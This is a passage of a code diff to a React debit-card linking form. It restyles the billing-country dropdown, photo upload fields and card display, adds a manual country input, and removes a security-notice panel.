                     required
                   />
                 </div>
-
-                <div style={styles.formGroup}>
-                  <label style={styles.label}>Country *</label>
-                  <select
-                    name="billing_country"
-                    value={formData.billing_country}
-                    onChange={handleChange}
-                    style={styles.select}
-                    required
-                  >
-                    <option value="United States">United States</option>
-                    <option value="Canada">Canada</option>
-                    <option value="United Kingdom">United Kingdom</option>
-                    <option value="Australia">Australia</option>
-                    <option value="Germany">Germany</option>
-                    <option value="France">France</option>
-                    <option value="Italy">Italy</option>
-                    <option value="Spain">Spain</option>
-                    <option value="Netherlands">Netherlands</option>
-                    <option value="Belgium">Belgium</option>
-                    <option value="Switzerland">Switzerland</option>
-                    <option value="Austria">Austria</option>
-                    <option value="Sweden">Sweden</option>
-                    <option value="Norway">Norway</option>
-                    <option value="Denmark">Denmark</option>
-                    <option value="Finland">Finland</option>
-                    <option value="Ireland">Ireland</option>
-                    <option value="New Zealand">New Zealand</option>
-                    <option value="Japan">Japan</option>
-                    <option value="South Korea">South Korea</option>
-                    <option value="Singapore">Singapore</option>
-                    <option value="Hong Kong">Hong Kong</option>
-                    <option value="Mexico">Mexico</option>
-                    <option value="Brazil">Brazil</option>
-                    <option value="Argentina">Argentina</option>
-                    <option value="Chile">Chile</option>
-                    <option value="Colombia">Colombia</option>
-                    <option value="Peru">Peru</option>
-                    <option value="South Africa">South Africa</option>
-                    <option value="Nigeria">Nigeria</option>
-                    <option value="Kenya">Kenya</option>
-                    <option value="Egypt">Egypt</option>
-                    <option value="India">India</option>
-                    <option value="China">China</option>
-                    <option value="Pakistan">Pakistan</option>
-                    <option value="Bangladesh">Bangladesh</option>
-                    <option value="Philippines">Philippines</option>
-                    <option value="Vietnam">Vietnam</option>
-                    <option value="Thailand">Thailand</option>
-                    <option value="Malaysia">Malaysia</option>
-                    <option value="Indonesia">Indonesia</option>
-                    <option value="United Arab Emirates">United Arab Emirates</option>
-                    <option value="Saudi Arabia">Saudi Arabia</option>
-                    <option value="Israel">Israel</option>
-                    <option value="Turkey">Turkey</option>
-                    <option value="Poland">Poland</option>
-                    <option value="Czech Republic">Czech Republic</option>
-                    <option value="Hungary">Hungary</option>
-                    <option value="Romania">Romania</option>
-                    <option value="Greece">Greece</option>
-                    <option value="Portugal">Portugal</option>
-                    <option value="Russia">Russia</option>
-                    <option value="Ukraine">Ukraine</option>
-                    <option value="Jamaica">Jamaica</option>
-                    <option value="Trinidad and Tobago">Trinidad and Tobago</option>
-                    <option value="Barbados">Barbados</option>
-                    <option value="Costa Rica">Costa Rica</option>
-                    <option value="Panama">Panama</option>
-                    <option value="Venezuela">Venezuela</option>
-                    <option value="Ecuador">Ecuador</option>
-                    <option value="Uruguay">Uruguay</option>
-                    <option value="Paraguay">Paraguay</option>
-                    <option value="Bolivia">Bolivia</option>
-                    <option value="Morocco">Morocco</option>
-                    <option value="Algeria">Algeria</option>
-                    <option value="Tunisia">Tunisia</option>
-                    <option value="Ghana">Ghana</option>
-                    <option value="Ethiopia">Ethiopia</option>
-                    <option value="Tanzania">Tanzania</option>
-                    <option value="Uganda">Uganda</option>
-                    <option value="Zambia">Zambia</option>
-                    <option value="Zimbabwe">Zimbabwe</option>
-                    <option value="Botswana">Botswana</option>
-                    <option value="Namibia">Namibia</option>
-                    <option value="Sri Lanka">Sri Lanka</option>
-                    <option value="Nepal">Nepal</option>
-                    <option value="Myanmar">Myanmar</option>
-                    <option value="Cambodia">Cambodia</option>
-                    <option value="Laos">Laos</option>
-                    <option value="Mongolia">Mongolia</option>
-                    <option value="Kazakhstan">Kazakhstan</option>
-                    <option value="Uzbekistan">Uzbekistan</option>
-                    <option value="Afghanistan">Afghanistan</option>
-                    <option value="Iraq">Iraq</option>
-                    <option value="Iran">Iran</option>
-                    <option value="Lebanon">Lebanon</option>
-                    <option value="Jordan">Jordan</option>
-                    <option value="Kuwait">Kuwait</option>
-                    <option value="Qatar">Qatar</option>
-                    <option value="Bahrain">Bahrain</option>
-                    <option value="Oman">Oman</option>
-                    <option value="Yemen">Yemen</option>
-                    <option value="Other">Other</option>
-                  </select>
-                </div>
               </div>
 
-              <h3 style={{ fontSize: '1.125rem', fontWeight: '700', color: '#1e293b', marginTop: '1.5rem', marginBottom: '1rem' }}>
+              <div style={styles.formGroup}>
+                <label style={styles.label}>Country *</label>
+                <select
+                  name="billing_country"
+                  value={formData.billing_country}
+                  onChange={handleChange}
+                  style={styles.select}
+                  required
+                >
+                  <option value="United States">United States</option>
+                  <option value="Canada">Canada</option>
+                  <option value="United Kingdom">United Kingdom</option>
+                  <option value="Australia">Australia</option>
+                  <option value="Germany">Germany</option>
+                  <option value="France">France</option>
+                  <option value="Italy">Italy</option>
+                  <option value="Spain">Spain</option>
+                  <option value="Netherlands">Netherlands</option>
+                  <option value="Belgium">Belgium</option>
+                  <option value="Switzerland">Switzerland</option>
+                  <option value="Austria">Austria</option>
+                  <option value="Sweden">Sweden</option>
+                  <option value="Norway">Norway</option>
+                  <option value="Denmark">Denmark</option>
+                  <option value="Finland">Finland</option>
+                  <option value="Ireland">Ireland</option>
+                  <option value="New Zealand">New Zealand</option>
+                  <option value="Singapore">Singapore</option>
+                  <option value="Japan">Japan</option>
+                  <option value="South Korea">South Korea</option>
+                  <option value="China">China</option>
+                  <option value="India">India</option>
+                  <option value="Brazil">Brazil</option>
+                  <option value="Mexico">Mexico</option>
+                  <option value="Argentina">Argentina</option>
+                  <option value="Chile">Chile</option>
+                  <option value="Colombia">Colombia</option>
+                  <option value="Peru">Peru</option>
+                  <option value="South Africa">South Africa</option>
+                  <option value="Nigeria">Nigeria</option>
+                  <option value="Kenya">Kenya</option>
+                  <option value="Egypt">Egypt</option>
+                  <option value="UAE">United Arab Emirates</option>
+                  <option value="Saudi Arabia">Saudi Arabia</option>
+                  <option value="Israel">Israel</option>
+                  <option value="Turkey">Turkey</option>
+                  <option value="Poland">Poland</option>
+                  <option value="Czech Republic">Czech Republic</option>
+                  <option value="Hungary">Hungary</option>
+                  <option value="Romania">Romania</option>
+                  <option value="Bulgaria">Bulgaria</option>
+                  <option value="Greece">Greece</option>
+                  <option value="Portugal">Portugal</option>
+                  <option value="Iceland">Iceland</option>
+                  <option value="Luxembourg">Luxembourg</option>
+                  <option value="Malta">Malta</option>
+                  <option value="Cyprus">Cyprus</option>
+                  <option value="Estonia">Estonia</option>
+                  <option value="Latvia">Latvia</option>
+                  <option value="Lithuania">Lithuania</option>
+                  <option value="Slovenia">Slovenia</option>
+                  <option value="Croatia">Croatia</option>
+                  <option value="Serbia">Serbia</option>
+                  <option value="Bosnia">Bosnia and Herzegovina</option>
+                  <option value="Albania">Albania</option>
+                  <option value="Macedonia">North Macedonia</option>
+                  <option value="Montenegro">Montenegro</option>
+                  <option value="Russia">Russia</option>
+                  <option value="Ukraine">Ukraine</option>
+                  <option value="Other">Other</option>
+                </select>
+              </div>
+
+              {formData.billing_country === 'Other' && (
+                <div style={styles.formGroup}>
+                  <label style={styles.label}>Specify Country *</label>
+                  <input
+                    type="text"
+                    name="manual_billing_country"
+                    value={formData.manual_billing_country}
+                    onChange={handleChange}
+                    style={styles.input}
+                    placeholder="Enter country name"
+                    required
+                  />
+                </div>
+              )}
+
+              <h3 style={{ fontSize: '1.125rem', fontWeight: '700', color: '#1e293b', marginTop: '2rem', marginBottom: '1rem' }}>
                 Card Verification Photos
               </h3>
-              <p style={{ fontSize: '0.875rem', color: '#64748b', marginBottom: '1rem' }}>
-                Please upload clear photos of the front and back of your card for verification.
+              <p style={{ fontSize: '0.9rem', color: '#64748b', marginBottom: '1.25rem' }}>
+                Upload clear photos of your card for verification purposes.
               </p>
 
               <div style={styles.formGroup}>
@@ -1036,7 +1012,7 @@ function LinkDebitCardContent() {
                   required
                 />
                 {formData.card_front_photo && (
-                  <small style={{ color: '#059669', fontSize: '0.75rem', marginTop: '0.25rem', display: 'block' }}>
+                  <small style={{ color: '#059669', fontSize: '0.8rem', marginTop: '0.5rem', display: 'block', fontWeight: '600' }}>
                     ✓ {formData.card_front_photo.name}
                   </small>
                 )}
@@ -1053,24 +1029,28 @@ function LinkDebitCardContent() {
                   required
                 />
                 {formData.card_back_photo && (
-                  <small style={{ color: '#059669', fontSize: '0.75rem', marginTop: '0.25rem', display: 'block' }}>
+                  <small style={{ color: '#059669', fontSize: '0.8rem', marginTop: '0.5rem', display: 'block', fontWeight: '600' }}>
                     ✓ {formData.card_back_photo.name}
                   </small>
                 )}
               </div>
 
-
               {linkedCards.length > 0 && (
-                <div style={{ ...styles.formGroup, display: 'flex', alignItems: 'center', gap: '0.5rem', marginBottom: '1.5rem' }}>
+                <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', marginTop: '1.75rem', marginBottom: '1.75rem' }}>
                   <input
                     type="checkbox"
                     name="is_primary"
                     checked={formData.is_primary}
                     onChange={handleChange}
                     id="is_primary"
-                    style={{ cursor: 'pointer', accentColor: '#059669' }}
+                    style={{ 
+                      cursor: 'pointer', 
+                      accentColor: '#059669',
+                      width: '20px',
+                      height: '20px'
+                    }}
                   />
-                  <label htmlFor="is_primary" style={{ ...styles.label, marginBottom: 0, cursor: 'pointer' }}>
+                  <label htmlFor="is_primary" style={{ ...styles.label, marginBottom: 0, cursor: 'pointer', fontSize: '1rem' }}>
                     Set as primary card
                   </label>
                 </div>
@@ -1082,33 +1062,52 @@ function LinkDebitCardContent() {
                 style={{
                   ...styles.buttonPrimary,
                   opacity: loading ? 0.6 : 1,
-                  cursor: loading ? 'not-allowed' : 'pointer'
+                  cursor: loading ? 'not-allowed' : 'pointer',
+                  marginTop: '1rem'
                 }}
+                onMouseOver={(e) => !loading && (e.target.style.transform = 'translateY(-2px)')}
+                onMouseOut={(e) => !loading && (e.target.style.transform = 'translateY(0)')}
               >
-                {loading ? 'Linking...' : 'Link Debit Card'}
+                {loading ? 'Linking Card...' : 'Link Debit Card'}
               </button>
             </form>
           )}
 
           {!showForm && linkedCards.length === 0 && (
             <div style={styles.emptyState}>
-              <p style={{ fontSize: '1.125rem', marginBottom: '0.5rem' }}>No linked debit cards yet</p>
-              <p>Click "Add New Card" to link your first debit card and start withdrawing.</p>
+              <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#cbd5e1" strokeWidth="1.5" style={{ margin: '0 auto 1rem' }}>
+                <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
+                <line x1="1" y1="10" x2="23" y2="10"></line>
+              </svg>
+              <p style={{ fontSize: '1.25rem', marginBottom: '0.75rem', fontWeight: '600', color: '#475569' }}>No linked cards yet</p>
+              <p style={{ fontSize: '1rem', color: '#94a3b8' }}>Click "Add New Card" above to link your first debit card</p>
             </div>
           )}
 
           {!showForm && linkedCards.map(card => (
-            <div key={card.id} style={styles.cardItem}>
-              {/* Visual Card Display */}
+            <div key={card.id} style={styles.cardItemContainer}>
               <div style={styles.cardVisualContainer}>
-                <div style={{ ...styles.cardVisual, ...getCardBackgroundClass(card.card_brand) }}>
+                <div style={{ ...styles.cardVisual, ...getCardBackgroundClass(card.card_brand) }}
+                     onMouseOver={(e) => e.currentTarget.style.transform = 'rotateY(5deg) rotateX(5deg)'}
+                     onMouseOut={(e) => e.currentTarget.style.transform = 'rotateY(0deg) rotateX(0deg)'}>
                   <div style={styles.cardVisualHeader}>
                     <span style={styles.cardBankName}>BANK NAME</span>
                     <span style={styles.cardTypeLabel}>DEBIT CARD</span>
                   </div>
 
                   <div style={styles.cardChipSection}>
-                    <div style={styles.cardChip}></div>
+                    <div style={styles.cardChip}>
+                      <div style={{
+                        position: 'absolute',
+                        top: '50%',
+                        left: '50%',
+                        transform: 'translate(-50%, -50%)',
+                        width: '70%',
+                        height: '60%',
+                        background: 'linear-gradient(45deg, rgba(0,0,0,0.1) 0%, transparent 50%, rgba(255,255,255,0.2) 100%)',
+                        borderRadius: '4px'
+                      }}></div>
+                    </div>
                     {card.is_primary && (
                       <div style={styles.primaryBadgeCard}>PRIMARY</div>
                     )}
@@ -1128,15 +1127,16 @@ function LinkDebitCardContent() {
                     <div>
                       <div style={styles.cardSmallLabel}>Expires</div>
                       <div style={styles.cardExpiryDisplay}>
-                        {card.expiry_month} / {card.expiry_year}
+                        {card.expiry_month}/{card.expiry_year}
                       </div>
                     </div>
                   </div>
-                  <div style={styles.cardBrandLogo}>{card.card_brand.toUpperCase()}</div>
+                  <div style={styles.cardBrandLogoContainer}>
+                    {getCardBrandLogo(card.card_brand)}
+                  </div>
                 </div>
               </div>
 
-              {/* Card Details */}
               <div style={styles.cardDetails}>
                 <div style={styles.detailItem}>
                   <div style={styles.detailLabel}>Billing Address</div>
@@ -1150,7 +1150,8 @@ function LinkDebitCardContent() {
                   <div style={styles.detailLabel}>Status</div>
                   <div style={{
                     ...styles.detailValue,
-                    color: card.status === 'active' ? '#059669' : card.status === 'pending' ? '#f59e0b' : '#dc2626'
+                    color: card.status === 'active' ? '#059669' : card.status === 'pending' ? '#f59e0b' : '#dc2626',
+                    fontWeight: '700'
                   }}>
                     {card.status.toUpperCase()}
                   </div>
@@ -1163,6 +1164,8 @@ function LinkDebitCardContent() {
                     onClick={() => handleSetPrimary(card.id)}
                     style={styles.buttonSecondary}
                     disabled={loading}
+                    onMouseOver={(e) => !loading && (e.target.style.backgroundColor = '#f0fdf4')}
+                    onMouseOut={(e) => !loading && (e.target.style.backgroundColor = 'white')}
                   >
                     Set as Primary
                   </button>
@@ -1171,27 +1174,14 @@ function LinkDebitCardContent() {
                   onClick={() => handleDelete(card.id)}
                   style={styles.buttonDanger}
                   disabled={loading}
+                  onMouseOver={(e) => !loading && (e.target.style.transform = 'translateY(-2px)')}
+                  onMouseOut={(e) => !loading && (e.target.style.transform = 'translateY(0)')}
                 >
-                  Remove
+                  Remove Card
                 </button>
               </div>
             </div>
           ))}
-        </div>
-
-        <div style={{ ...styles.card, backgroundColor: '#f0f9ff', border: '2px solid #0ea5e9' }}>
-          <h3 style={{ fontSize: '1rem', fontWeight: '700', color: '#0c4a6e', marginBottom: '0.75rem', display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
-            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ color: '#075985' }}>
-              <rect x="3" y="11" width="18" height="13" rx="2" ry="2"></rect>
-              <path d="M7 15h10v4H7z"></path>
-              <line x1="8" y1="2" x2="8" y2="4"></line>
-              <line x1="16" y1="2" x2="16" y2="4"></line>
-            </svg>
-            Security Notice
-          </h3>
-          <p style={{ fontSize: '0.875rem', color: '#075985', lineHeight: '1.6', margin: 0 }}>
-            Your card information is encrypted and stored securely using industry-standard protocols. We never store your full card number. All transactions are processed through secure, PCI-compliant systems to ensure the safety of your financial data. Card images are used solely for verification purposes and are stored securely.
-          </p>
         </div>
       </div>
     </div>
